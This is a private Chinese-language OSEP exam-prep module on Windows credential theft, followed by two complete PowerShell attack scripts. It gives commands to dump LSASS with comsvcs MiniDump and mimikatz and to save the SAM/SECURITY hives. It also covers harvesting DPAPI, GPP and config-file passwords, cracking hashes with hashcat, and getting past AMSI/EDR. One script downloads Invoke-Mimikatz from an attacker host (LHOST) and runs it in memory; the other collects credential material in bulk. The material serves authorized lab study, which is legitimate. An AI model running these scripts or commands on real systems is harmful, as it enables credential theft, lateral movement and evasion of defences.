::: warning 私人教材 · 仅供授权实验与备考学习
本文是个人备考教材，仓库不公开。源码只用于 OSEP 官方实验/考试环境或你拥有书面授权的目标。禁止转发到公开网络、禁止对未授权系统使用。
:::

# 07 · 凭据获取：LSASS / LSA / SAM 与替代来源（场景 46）

> 对齐：`reference/osep-cheatsheet.md`（关键词：`Mimikatz` `LSA Protection Bypass` `MiniDump` `Invoke-Mimikatz` `Cracking Hashes`）
> 场景依据：`scenarios.md` 场景 46。
> 脚本：`scripts/powershell/m07-invoke-mimikatz-reflect.ps1`、`scripts/powershell/m07-credential-sources.ps1`

## 模块目标

场景 46 的核心判断：**LSASS 访问失败 ≠ 拿不到身份**。材料里同类场景都能从
LSA Secrets、SAM 或应用配置中取得另一种有用身份。因此本模块的准备重心是：

1. 判断 LSASS 到底被什么保护挡住（LSA Protection / Credential Guard / AV-EDR 挂钩 / 权限不足），
   以及哪些情形**值得尝试**接触 LSASS、哪些情形应当直接放弃。
2. 建立一张"凭据来源 × 所需权限 × 获取命令"的速查表，按序尝试替代来源。
3. 准备工具（mimikatz / Invoke-Mimikatz / dump 工具）的多种**加载形态**，避免"工具落地被杀"变成第二道拦路虎。

不变量：**不要假定能绕过 LSASS 保护**。只有确认保护类型与自身权限后再选择手段；
对 RunAsPPL / Credential Guard，材料中的替代来源路线几乎总是更快。

---

## 场景 46：凭据工具被拦，且 LSASS 本身受到保护

### 场景回顾

- 已取得**较高本地权限**（管理员或 SYSTEM），但 LSASS 访问失败（读取被拒 / 工具被杀 / 注入失败）。
- 目标：从机器上取得**另一种可用身份**（本地或域用户明文/哈希/票据/DPAPI 材料）。
- 参考路线：先确认 LSASS 保护形态 → 分类尝试替代来源（LSA Secrets、SAM、DPAPI、
  注册表、配置文件、GPP、计划任务）→ 最后才评估是否有必要与可行的方法接触 LSASS。

### 前提与假设

- 已有高本地权限会话（能 `reg save` / 读 `HKLM\SECURITY`、`HKLM\SAM`，或运行 SYSTEM 上下文工具）。
- 假设不成立时的退路：若是低权限且无提权路径，本场景不成立——先做本地枚举，
  参考 M06 / M12 提权与横向路线，不要浪费时间硬碰 LSASS。
- 假设杀软/EDR 可能在进程创建、`OpenProcess`、`.dll` 落地、AMSI 各层拦截（场景 19 行为检测思路同样适用）。

### 准备（攻击机侧）

- 静态工具：`mimikatz.exe`（x64/x86）、`procdump.exe`、`sekurlsa` 对应驱动（一般不落地）。
- 内存形态：`Invoke-Mimikatz.ps1`（PowerSploit）与一段反射加载入口——见
  `scripts/powershell/m07-invoke-mimikatz-reflect.ps1`（含 comsvcs MiniDump 备选，不依赖下载器）。
- 来源清单脚本：`scripts/powershell/m07-credential-sources.ps1`（按来源分类 + 所需权限 + 一键收集）。
- 离线解析环境：装有 mimikatz / secretsdump / hashcat 的攻击机（把 dump 或 hive 拷回分析）。
- 目标侧速查命令（不落地任何东西就能先看环境）：

```powershell
# 当前权限与 SeDebugPrivilege
whoami /priv
# LSASS 是否受 RunAsPPL 保护（0 未启用；2=签名+PPL 启动）
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LsaCfgFlags   # 非 0 提示 Credential Guard 相关
# LSASS 进程（PID / 完整性）
Get-Process lsass | Select-Object Id, Name
# 尝试最小接触：确认是"权限被拒"还是"进程被保护"
tasklist /FI "IMAGENAME eq lsass.exe"
```

### 执行步骤

**第 0 步 · 判型（决定要不要碰 LSASS）**

1. `whoami /priv` 无 `SeDebugPrivilege`（且非 SYSTEM）→ 无法常规 dump，直接跳到第 2 步替代来源。
2. `RunAsPPL` 值为 2 → LSA Protection 开启；`LsaCfgFlags` 非 0 → Credential Guard 方向。
   两者都不是"一条命令能绕"的配置；**默认放弃 LSASS 直读**，进入替代来源。
3. 无保护标记但仍失败（被杀/报错）→ 多为 AV/EDR：改加载形态（第 1 步 C/D），而不是换 dump 姿势。

**第 1 步 · 仅当无 PPL/Credential Guard 时接触 LSASS（按形态备选）**

- A. 常规内存执行：mimikatz PE 落地运行或 `Invoke-Mimikatz -Command '"sekurlsa::logonpasswords" "exit"'`
  （需先把函数载入内存，见脚本反射形态）。
- B. 官方 dump + 离线分析（留痕最小、最稳）：
  `rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Windows\Temp\ls.dmp full`
  或 `procdump -ma <LSASS_PID> ls.dmp`；拷回攻击机用 mimikatz `sekurlsa::minidump ls.dmp` 离线解析。
- C. .NET 程序集加载（规避落地 EXE 与部分进程创建检测）：把 mimikatz 作为程序集用
  `Assembly.Load` + 反射入口执行（配合 `m07-invoke-mimikatz-reflect.ps1` 的 `-Mode Assembly` 占位）。
- D. 命令行混淆/编码调用（防 AMSI 静态特征），注意场景 18：先编码/加密再投递。

> 产物清单：`sekurlsa::logonpasswords`（交互式登录缓存明文/NTLM）、`sekurlsa::wdigest`、
> `sekurlsa::kerberos`（票据）、`sekurlsa::msv`（msv1_0 缓存）。

**第 2 步 · 替代来源（按权限从高到低，优先 SYSTEM 才能读的）**

用 `scripts/powershell/m07-credential-sources.ps1` 一键收集，或手工按速查表：

| 来源 | 内容 | 所需权限 | 关键命令/位置 |
|---|---|---|---|
| LSA Secrets | `DefaultPassword`、服务账户密码、DPAPI 机器密钥 | SYSTEM | `reg save HKLM\SECURITY sec.hive` → secretsdump / mimikatz `lsadump::secrets` |
| SAM | 本地账户 NTLM 哈希 | SYSTEM | `reg save HKLM\SAM sam.hive` + `HKLM\SYSTEM sys.hive` → `secretsdump -sam -system` |
| 注册表 Winlogon/AutoLogon | 明文密码 | 管理员 | `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"` |
| 缓存的域登录 | 域凭据缓存（DCC2） | SYSTEM | `lsadump::cache`（离线破解需 DCC2） |
| DPAPI | 用户主密钥 + 应用密码（浏览器/Outlook/保险箱） | 对应用户 | 用户目录 `AppData\Roaming\Microsoft\Protect` + 上下文内解密 |
| WDigest | 明文（旧系统默认开） | SYSTEM | `sekurlsa::wdigest` |
| 配置文件 | 部署/脚本里的硬编码密码 | 读权限即可 | `unattend.xml`、`web.config`、`*.config`、`*.ps1`/`*.bat`/`*.xml` 全盘搜索 |
| GPP | 域组策略首选项密码 | 读 SYSVOL（域用户即可） | `SYSVOL\...\Policies\*\MACHINE\Preferences\Groups\Groups.xml` 的 `cPassword` |
| 计划任务 | 任务动作里引用的凭据/脚本 | 管理员读注册表 | `schtasks /query /fo LIST /v` + `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache` |

**第 3 步 · 离线破解（可回攻击机做）**

```bash
# NTLM（SAM/LSA Secrets/sekurlsa 产物）
hashcat -m 1000 ntlm.txt wordlist.txt
# NetNTLMv2（若后续抓到中继哈希，m16/其他场景产物）
hashcat -m 5600 netntlmv2.txt wordlist.txt
# DCC2（缓存域凭据）
hashcat -m 2100 dcc2.txt wordlist.txt
# 拿到明文/哈希后的使用：见 M15（WinRM 哈希/明文）、M12（PTT/over-pass-the-hash 票据）
```

### 用到的脚本

- `scripts/powershell/m07-invoke-mimikatz-reflect.ps1` —— LSASS 无保护时的加载形态备选
  （反射执行 / comsvcs MiniDump / 程序集占位）＋ RunAsPPL 与权限预检。
- `scripts/powershell/m07-credential-sources.ps1` —— 替代来源一键收集（来源分类 + 所需权限）。
- 均为"按需取用"而不是自动打全场：先看输出决定下一步。

### 验证

- 判型结果与现象一致：PPL 开启时预期 `OpenProcess`/dump 被拒；无保护时 dump 能产生非空文件。
- SAM/LSA Secrets：在攻击机 `secretsdump -sam sam.hive -system sys.hive LOCAL`（或对 hive 跑 mimikatz
  `lsadump::sam /system:sys.hive`）能列出哈希；挑一个 NTLM 用它做一次横向认证（M15）即闭环。
- LSA Secrets 找到的账户密码：`net use \\TARGET\IPC$ /user:DOMAIN\USER PASS` 或 WinRM 登录验证。
- DPAPI/配置文件/GPP：取到的明文能直接认证；GPP 密码用 `gpp-decrypt` 先解 `cPassword`。

### 失败分支与备选

1. **LSASS 完全读不到（PPL/Credential Guard）且替代来源也空**：不要滞留。把会话能力转成横向/枚举资产
   （M12/M15），换一台机器重复来源清单；本模块目标是"另一种身份"，不是必须拿到 LSASS。
2. **dump 成功但离线解析为空**：用 `sekurlsa::minidump` 版本与 mimikatz 版本匹配（新版系统用新版 mimikatz）；
   或检查是否误 dump 了非 LSASS 进程、PID 对错（64 位机器用 x64 工具）。
3. **工具落地被杀 / 进程创建被拦**：改用 comsvcs `MiniDump` 或 .NET 反射形态，避免在目标上写 mimikatz.exe。
4. **SAM 没本地账户 / LSA Secrets 无可复用密码**：回到配置文件/计划任务/GPP 搜索；域环境优先看 GPP 与
   计划任务里残留的域凭据。
5. **拿到的哈希是空密码或已失效**：验证步骤必须"实际认证一次"；不要在无法认证的哈希上继续破解浪费时间。

### 考试注意 OPSEC

- **不要在启用了 LSA Protection / Credential Guard 的机器上反复尝试 dump**：高噪声、大概率失败，还留下
  EDR 警报。先判型（30 秒），不合适就切替代来源。
- `reg save` / 大文件拷贝留痕明显：dump 与 hive 用系统目录或已有白名单目录，尽快拷走并清理。
- mimikatz 与 `Invoke-Mimikatz` 是强静态特征：内存加载形态优先；必要时先编码/加密再投递（场景 18）。
- 用拿到的身份**实际认证一次**来验证，但认证失败会锁账户的策略下（如多次尝试域账户密码）要谨慎——
  优先用哈希做 pass-the-hash（不触发密码策略），而不是盲目猜测明文。
- 记录每个来源的权限要求，避免用 SYSTEM 之外上下文白跑（本模块脚本已标注所需权限）。

---

#### 源码 `scripts/powershell/m07-invoke-mimikatz-reflect.ps1` {#scripts-powershell-m07-invoke-mimikatz-reflect-ps1}

````powershell
<#
用途：LSASS 无强保护时的凭据获取——内存加载 Invoke-Mimikatz（不落盘 ps1/exe）或 comsvcs MiniDump 备选
场景：46（先判型再动手：本脚本只处理"确认可接触 LSASS"的分支；PPL/Credential Guard 开启时按模块结论直接放弃，改用 m07-credential-sources.ps1）
依赖：PowerShell 3.0+；Invoke 形态需要可读到的 Invoke-Mimikatz.ps1（本地文件或 HTTP 源）；
      MiniDump 形态需要 SeDebugPrivilege（管理员/SYSTEM）；两者在 RunAsPPL>=2 或 Credential Guard 下都会被拒
使用：powershell -ep bypass -f m07-invoke-mimikatz-reflect.ps1 -Mode Invoke -SourceFile C:\Windows\Temp\Invoke-Mimikatz.ps1 -Command '"sekurlsa::logonpasswords" "exit"'
      远程源：... -Mode Invoke -SourceUrl http://LHOST/Invoke-Mimikatz.ps1
      dump 形态：... -Mode MiniDump -LsassPid 1234 -DumpDir C:\Windows\Temp
      强制无视判型（一般不推荐）：... -Force
占位符：LHOST=托管 Invoke-Mimikatz.ps1 的攻击机 IP；SourceFile/SourceUrl 二选一
测试状态：未在 Windows 实测（本机 macOS）；语法已人工检查。若 AMSI 拦截本脚本/被投递内容，先按场景 18/19（编码/加密、宿主匹配）处理后再投递
#>
[CmdletBinding()]
param(
    [ValidateSet('Invoke', 'MiniDump')][string]$Mode = 'Invoke',
    [string]$Command = '"sekurlsa::logonpasswords" "exit"',
    [string]$SourceFile = '',
    [string]$SourceUrl = '',
    [int]$LsassPid = 0,
    [string]$DumpDir = "$env:WINDIR\Temp",
    [switch]$Force
)

function Section($t) { Write-Output ""; Write-Output ("=" * 12 + " $t " + "=" * 12) }
function Test-Admin {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    $p = New-Object Security.Principal.WindowsPrincipal($id)
    return ($p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -or $id.IsSystem)
}
function Get-LsaProtectionStatus {
    # RunAsPPL: 0=未启用; 1=签名要求; 2=签名+PPL 启动(不可常规 dump)。LsaCfgFlags 非 0 提示 Credential Guard 方向。
    $out = [pscustomobject]@{ RunAsPPL = 0; LsaCfgFlags = 0 }
    try {
        $l = (& reg.exe query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL 2>$null)
        if ($l -match '0x([0-9a-fA-F]+)') { $out.RunAsPPL = [Convert]::ToInt32($Matches[1], 16) }
        $c = (& reg.exe query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LsaCfgFlags 2>$null)
        if ($c -match '0x([0-9a-fA-F]+)') { $out.LsaCfgFlags = [Convert]::ToInt32($Matches[1], 16) }
    } catch { }
    return $out
}
function Enable-SeDebugPrivilege {
    # 为当前进程打开 SeDebugPrivilege（TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY）
    if (-not ('M07Priv.Native' -as [type])) {
        Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
namespace M07Priv {
    [StructLayout(LayoutKind.Sequential)]
    public struct LuidAttr { public long Luid; public uint Attributes; }
    [StructLayout(LayoutKind.Sequential)]
    public struct TokenPrivileges { public uint PrivilegeCount; public LuidAttr Privilege; }
    public static class Native {
        [DllImport("advapi32.dll", SetLastError=true)] public static extern bool OpenProcessToken(IntPtr h, uint a, out IntPtr t);
        [DllImport("advapi32.dll", SetLastError=true)] public static extern bool LookupPrivilegeValue(string s, string n, out long l);
        [DllImport("advapi32.dll", SetLastError=true)] public static extern bool AdjustTokenPrivileges(IntPtr t, bool d, ref TokenPrivileges n, uint b, IntPtr p, IntPtr r);
    }
}
'@
    }
    $h = [IntPtr]::Zero
    $proc = [System.Diagnostics.Process]::GetCurrentProcess()
    if (-not [M07Priv.Native]::OpenProcessToken($proc.Handle, 0x28, [ref]$h)) { return $false }
    $luid = [long]0
    if (-not [M07Priv.Native]::LookupPrivilegeValue($null, 'SeDebugPrivilege', [ref]$luid)) { return $false }
    $tp = New-Object M07Priv.TokenPrivileges
    $tp.PrivilegeCount = 1; $tp.Privilege.Luid = $luid; $tp.Privilege.Attributes = 0x2  # SE_PRIVILEGE_ENABLED
    $ok = [M07Priv.Native]::AdjustTokenPrivileges($h, $false, [ref]$tp, 0, [IntPtr]::Zero, [IntPtr]::Zero)
    return $ok
}

Section "判型（决定是否值得碰 LSASS）"
if (-not (Test-Admin)) {
    Write-Output "[-] 非管理员/SYSTEM：常规无法读 LSASS。建议改用 m07-credential-sources.ps1 走替代来源。"
    if (-not $Force) { exit 1 }
}
$priv = Enable-SeDebugPrivilege
Write-Output ("[+] SeDebugPrivilege 可用(已尝试启用)：{0}" -f $priv)
$prot = Get-LsaProtectionStatus
Write-Output ("[+] LSA 保护：RunAsPPL={0} LsaCfgFlags={1}（>=2 表示常规 dump 会被拒）" -f $prot.RunAsPPL, $prot.LsaCfgFlags)
if (($prot.RunAsPPL -ge 2 -or $prot.LsaCfgFlags -ne 0) -and -not $Force) {
    Write-Output "[-] LSASS 受 LSA Protection / Credential Guard 保护：按模块结论不假定能绕过，转 m07-credential-sources.ps1（SAM/LSA Secrets/注册表/DPAPI/配置文件/GPP/计划任务）。"
    exit 2
}

if ($Mode -eq 'Invoke') {
    Section "Invoke-Mimikatz（内存反射，不落盘）"
    $src = ''
    if ($SourceFile -ne '') { $src = Get-Content -Raw -LiteralPath $SourceFile -ErrorAction Stop }
    elseif ($SourceUrl -ne '') {
        Write-Output "[*] 从 $SourceUrl 拉取（代理/出网见 docs/09）..."
        $src = (New-Object System.Net.WebClient).DownloadString($SourceUrl)
    } else { Write-Output "[-] Invoke 形态需要 -SourceFile 或 -SourceUrl（Invoke-Mimikatz.ps1 本体过大不宜内嵌）"; exit 3 }
    Invoke-Expression $src
    if (-not (Get-Command Invoke-Mimikatz -ErrorAction SilentlyContinue)) {
        Write-Output "[-] 函数 Invoke-Mimikatz 未成功载入（可能被 AMSI/语言模式拦截，按场景 18/19 处理后重试）"; exit 4
    }
    Write-Output "[*] 执行：$Command"
    & (Get-Command Invoke-Mimikatz) -Command $Command
    Write-Output "[*] 完成。输出含 logonpasswords 缓存时，用其中身份做实际认证验证（M15/M12）。"
}
else {
    Section "MiniDump（comsvcs.dll，产物离线解析）"
    $ls = if ($LsassPid -gt 0) { Get-Process -Id $LsassPid -ErrorAction Stop } else { Get-Process lsass -ErrorAction Stop }
    $stamp = Get-Date -Format 'yyyyMMdd_HHmmss'
    $out = Join-Path $DumpDir ("lsass_{0}_{1}.dmp" -f $ls.Id, $stamp)
    Write-Output "[*] dump LSASS PID=$($ls.Id) -> $out"
    # 直接 rundll32 comsvcs MiniDump；被 PPL 挡住时进程会失败/文件为空，属预期（见判型）
    & rundll32.exe "$env:WINDIR\System32\comsvcs.dll, MiniDump" $ls.Id $out "full"
    Start-Sleep -Seconds 2
    if ((Test-Path $out) -and ((Get-Item $out).Length -gt 0)) {
        Write-Output "[+] dump 成功：$out ($((Get-Item $out).Length) bytes)"
        Write-Output "[*] 拷贝回攻击机离线解析：mimikatz.exe \"sekurlsa::minidump $out\" \"sekurlsa::logonpasswords\" \"exit\""
    } else {
        Write-Output "[-] dump 失败/为空：确认 SeDebugPrivilege、未开 PPL、PID 正确；或换 -Mode Invoke 形态"
    }
}
````

#### 源码 `scripts/powershell/m07-credential-sources.ps1` {#scripts-powershell-m07-credential-sources-ps1}

````powershell
<#
用途：按"凭据来源"分类收集 Windows 凭据材料（SAM / LSA Secrets / 注册表 AutoLogon / 缓存登录 / DPAPI / 配置文件 / 计划任务 / GPP），每种标注所需权限与产物，供离线解析
场景：46 —— LSASS 受保护或凭据工具被拦时改走替代来源；拿到高权限（尤其 SYSTEM）后把机器上身份材料一次扫清
依赖：管理员可覆盖大部分；SAM、LSA Secrets、缓存登录需 SYSTEM；DPAPI 需对应用户会话；GPP 需域身份且 SYSVOL 可达
使用：powershell -ep bypass -f m07-credential-sources.ps1 -WorkDir C:\Windows\Temp
      最大化覆盖（建议）：以 SYSTEM 运行本脚本（PsExec -s / schtasks /create /ru SYSTEM /run，参考 M06/M27 思路）
      GPP 检索需带域：... -Domain corp.local
占位符：DOMAIN=目标域 FQDN（SYSVOL 路径）；WorkDir=产物保存目录（需可写，建议系统目录）
测试状态：未在 Windows 实测（本机 macOS）；语法已人工检查。reg save 的 hive 与 Groups.xml 均带回攻击机离线解析，不在目标上破解
#>
[CmdletBinding()]
param(
    [string]$WorkDir = "$env:WINDIR\Temp\m07creds",
    [string]$Domain = '',          # 例如 corp.local；非空才做 GPP(SYSVOL) 检索
    [switch]$SkipConfigScan        # 配置文件全盘类扫描较吵，可跳过
)

function Section($t) { Write-Output ""; Write-Output ("=" * 12 + " $t " + "=" * 12) }
function Try-Run($label, [scriptblock]$block) {
    try { Write-Output ("[+] {0}: {1}" -f $label, (& $block)) }
    catch { Write-Output ("[-] {0}: {1}" -f $label, $_.Exception.Message) }
}
function Test-Admin {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    $p = New-Object Security.Principal.WindowsPrincipal($id)
    return ($p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -or $id.IsSystem)
}

New-Item -ItemType Directory -Force -Path $WorkDir | Out-Null
$Sys  = (whoami) -match 'nt authority\\system'
$Admin = Test-Admin
Write-Output "[*] 上下文：$(whoami) | 管理员=$Admin | SYSTEM=$Sys | 产物目录=$WorkDir"
Write-Output "[*] 权限图例：SYSTEM > 管理员 > 当前用户 > 读权限即可。本脚本只收集不破解；hive/Groups.xml 回攻击机离线处理。"

Section "1. SAM（本地账户 NTLM）— 需 SYSTEM"
if ($Sys) {
    & reg.exe save HKLM\SAM "$WorkDir\sam.hive" /y *> $null
    & reg.exe save HKLM\SYSTEM "$WorkDir\sys.hive" /y *> $null
    if ((Test-Path "$WorkDir\sam.hive")) {
        Write-Output "[+] sam.hive/sys.hive 已保存。离线：secretsdump -sam sam.hive -system sys.hive LOCAL（或 mimikatz lsadump::sam /system:sys.hive）"
    } else { Write-Output "[-] reg save 失败（需 SYSTEM + SeBackupPrivilege）" }
} else { Write-Output "[-] 当前非 SYSTEM，跳过。提权到 SYSTEM 后重跑本段（PsExec -s / 计划任务 / M06）" }

Section "2. LSA Secrets — 需 SYSTEM（服务账户密码/DPAPI 机器密钥）"
if ($Sys) {
    & reg.exe save HKLM\SECURITY "$WorkDir\sec.hive" /y *> $null
    if ((Test-Path "$WorkDir\sec.hive")) {
        Write-Output "[+] sec.hive 已保存。离线：secretsdump -security sec.hive -system sys.hive LOCAL（或 mimikatz lsadump::secrets /system:sys.hive）"
    } else { Write-Output "[-] reg save 失败" }
} else { Write-Output "[-] 非 SYSTEM 跳过（HKLM\SECURITY 管理员也不可读）" }

Section "3. 注册表 AutoLogon/Winlogon（明文）— 读权限/管理员"
Try-Run "Winlogon AutoLogon 值" {
    (& reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon 2>$null)
    (& reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName 2>$null)
    (& reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName 2>$null)
    $dp = (& reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword 2>$null)
    if ($dp) { $dp } else { "DefaultPassword 未设置（或不可读）" }
}
Try-Run "注册表残留密码键" {
    $keys = 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon','HKLM\SYSTEM\CurrentControlSet\Control\Lsa'
    $found = foreach ($k in $keys) { (& reg.exe query $k /s 2>$null) | Select-String -Pattern 'Password|Secret' }
    if ($found) { ($found | Select-Object -First 5).Line -join ' | ' } else { '未发现明显密码键' }
}

Section "4. 缓存域登录 — 需 SYSTEM（DCC2 哈希）"
if ($Sys) {
    Try-Run "HKLM\SECURITY\Cache 条目" {
        $n = (& reg.exe query "HKLM\SECURITY\Cache" 2>$null | Select-String -Pattern 'NL\$' ).Count
        "缓存条目数≈$n（离线解析：mimikatz lsadump::cache /system:sys.hive，破解 hashcat -m 2100）"
    }
} else { Write-Output "[-] 非 SYSTEM 跳过" }

Section "5. DPAPI（主密钥/凭据文件）— 需对应用户会话"
Try-Run "当前用户 DPAPI" {
    $u = $env:USERPROFILE
    $roam = "$u\AppData\Roaming\Microsoft\Protect"; $loc = "$u\AppData\Local\Microsoft\Protect"
    $cred = "$u\AppData\Local\Microsoft\Credentials"; $vault = "$u\AppData\Local\Microsoft\Vault"
    $r = @()
    if (Test-Path $roam) { $r += "Roaming主密钥x$((Get-ChildItem $roam -Recurse -File -EA SilentlyContinue).Count)" }
    if (Test-Path $loc)  { $r += "Local主密钥x$((Get-ChildItem $loc -Recurse -File -EA SilentlyContinue).Count)" }
    if (Test-Path $cred) { $r += "Credentials文件x$((Get-ChildItem $cred -Recurse -File -EA SilentlyContinue).Count)" }
    if (Test-Path $vault) { $r += "Vault目录存在" }
    if ($r) { $r -join ' | ' } else { '无（或当前用户无 DPAPI 材料）' }
}
Try-Run "其他用户目录（仅盘点，解密需对应用户）" {
    (Get-ChildItem C:\Users -Directory -EA SilentlyContinue | Where-Object { $_.Name -notin @('Public','Default','Default User','All Users') } | Select-Object -ExpandProperty Name) -join ', '
}

Section "6. 配置文件残留密码 — 读权限即可"
if (-not $SkipConfigScan) {
    $dirs = 'C:\Windows\Panther','C:\Windows\System32\sysprep','C:\inetpub','C:\ProgramData','C:\Users\Public'
    $files = Get-ChildItem $dirs -Recurse -Include unattend*.xml,*.config,*.ps1,*.bat,*.cmd,*.vbs,*.xml,*.txt -File -EA SilentlyContinue |
             Where-Object { $_.Length -lt 2MB } | Select-Object -First 400
    $hits = $files | Select-String -Pattern 'password\s*[=:]\s*\S+|passwd\s*[=:]\s*\S+|<Password>|<Value>|pwd\s*=' -EA SilentlyContinue | Select-Object -First 15
    if ($hits) { ($hits | ForEach-Object { "{0}:{1}" -f $_.Path, $_.Line.Trim() }) -join "`n" }
    else { '未发现（可人工扩大目录：含 web.config 的站点目录、用户家目录脚本）' }
} else { Write-Output '[-] 已按 -SkipConfigScan 跳过' }

Section "7. 计划任务动作里的脚本/凭据 — 管理员"
Try-Run "任务动作引用的脚本" {
    $csv = (& schtasks.exe /query /fo csv /v 2>$null) | ConvertFrom-Csv
    $scripts = $csv | Where-Object { $_.'Task To Run' -match '\.(bat|cmd|ps1|vbs|js|exe) ' -and $_.'Task To Run' -notmatch '\\Windows\\' } |
               Select-Object -First 8
    if ($scripts) { ($scripts | ForEach-Object { "{0} -> {1} (RunAs:{2})" -f $_.TaskName, $_.'Task To Run', $_.'Run As User' }) -join "`n" }
    else { '无非系统脚本类任务动作（仍建议抽查 TaskCache 注册表）' }
}

Section "8. GPP（SYSVOL 组策略首选项）— 域身份+读 SYSVOL"
if ($Domain -ne '') {
    $pol = "\\$Domain\SYSVOL\$Domain\Policies"
    if (Test-Path $pol) {
        $g = Get-ChildItem $pol -Recurse -Filter Groups.xml -File -EA SilentlyContinue
        foreach ($f in $g) {
            $m = [regex]::Matches((Get-Content -Raw $f.FullName), 'userName="([^"]+)"[^>]*?cPassword="([^"]+)"')
            if ($m.Count) { Write-Output ("[+] {0}: {1}" -f $f.FullName, (($m | ForEach-Object { "$($_.Groups[1].Value):$($_.Groups[2].Value)" }) -join ', ')) }
        }
        Write-Output "[*] 上列 cPassword 用 gpp-decrypt 离线解；也顺带扫 SYSVOL 下其他 .xml/.ini 残留"
    } else { Write-Output "[-] SYSVOL 不可达（$pol）。检查：本机是否加域、当前身份是否有域权限、DNS 是否正确" }
} else { Write-Output "[-] 未给 -Domain，跳过 GPP；加域机器建议补跑" }

Section "完成：产物与下一步"
Write-Output "[*] 产物目录 $WorkDir 内 hive 文件列表："
Get-ChildItem $WorkDir -File | ForEach-Object { "    $($_.Name) ($($_.Length) bytes)" }
Write-Output "[*] 优先级：SYSTEM 环境先解析 SAM/LSA Secrets（常含可直接过横向的身份）；无 SYSTEM 时先查配置文件/计划任务/GPP（读权限即可）"
Write-Output "[*] 解析出的身份用 M15（WinRM 明文/哈希）或 M12（PTT/委派）实际认证一次来验证，勿停留在哈希值本身"
````

## cheat sheet 关键词对照（速记）

| 关键词 | 本模块落点 |
|---|---|
| `Mimikatz` | 无 PPL 时的内存执行/离线 minidump 解析（第 1 步） |
| `LSA Protection Bypass` | 只评估不假定：`RunAsPPL` 判型，PPL 开启默认走替代来源 |
| `MiniDump` | `rundll32 comsvcs.dll,MiniDump` / procdump + 攻击机离线解析 |
| `Invoke-Mimikatz` | 反射加载形态脚本 `m07-invoke-mimikatz-reflect.ps1` |
| `Cracking Hashes` | `hashcat -m 1000/2100/5600`（NTLM / DCC2 / NetNTLMv2） |

## 相关模块

- 拿到身份后横向：M15（WinRM 明文/哈希）、M12（票据 / over-pass-the-hash / 委派）。
- 本地权限不足时先提权：M06；行为检测对抗思路：M05 场景 19。
- 哈希中继与抓取场景（非本场景主路）：M16 / M11（responder、SQL 触发认证）。
